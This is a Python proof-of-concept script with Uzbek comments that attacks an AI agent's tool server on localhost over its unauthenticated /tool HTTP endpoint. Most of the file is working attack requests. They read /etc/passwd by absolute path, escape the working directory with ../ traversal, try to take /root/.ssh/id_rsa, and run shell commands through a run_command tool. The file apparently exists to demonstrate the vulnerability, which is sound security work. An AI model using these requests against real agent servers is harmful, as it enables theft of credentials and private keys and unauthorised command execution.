"""
poc_remote.py — server.py (localhost:8000) ga HTTP orqali hujum qiluvchi PoC.

Bu skript "tashqi hujumchi" rolini o'ynaydi: u agent serverining ichki
fayl tizimiga to'g'ridan-to'g'ri kirish huquqiga ega EMAS — faqat
/tool HTTP endpointi orqali muloqot qiladi (xuddi real API mijozidek).

Foydalanish:
    1-terminalda:  python3 server.py   yoki   uvicorn server:app --port 8000
    2-terminalda:  python3 poc_remote.py
"""

import requests

BASE = "http://127.0.0.1:8000"


def call_tool(tool, args):
    r = requests.post(f"{BASE}/tool", json={"tool": tool, "args": args}, timeout=10)
    return r.json()


print("=" * 70)
print("0) Server holatini tekshirish")
print("=" * 70)
print(requests.get(BASE).json())

print()
print("=" * 70)
print("1) Legitim so'rov — workdir ICHIDAGI faylni o'qish (kutilgan xatti-harakat)")
print("=" * 70)
resp = call_tool("read_file", {"path": "normal.txt"})
print(resp)

print()
print("=" * 70)
print("2) HUJUM — absolyut yo'l orqali /etc/passwd o'qish")
print("=" * 70)
resp = call_tool("read_file", {"path": "/etc/passwd"})
print(resp.get("result", resp)[:500] if isinstance(resp.get("result"), str) else resp)

print()
print("=" * 70)
print("3) HUJUM — ../ orqali workdir'dan tashqaridagi 'maxfiy' faylni o'qish")
print("=" * 70)
resp = call_tool("read_file", {"path": "../secret_zone/topsecret.txt"})
print(resp)

print()
print("=" * 70)
print("4) HUJUM — SSH private key'ni o'g'irlashga urinish (odatiy nishon)")
print("=" * 70)
resp = call_tool("read_file", {"path": "/root/.ssh/id_rsa"})
print(resp)

print()
print("=" * 70)
print("5) HUJUM — RunCommand orqali buyruq bajarish (shell=True + tashqi cmd)")
print("=" * 70)
resp = call_tool("run_command", {"cmd": "whoami && id && pwd"})
print(resp)

print()
print("=" * 70)
print("XULOSA: Tashqi HTTP client hech qanday autentifikatsiyasiz")
print("serverning fayl tizimiga (workdir tashqarisiga) va buyruq")
print("bajarish imkoniyatiga to'liq kirish huquqiga ega bo'ldi.")
print("=" * 70)
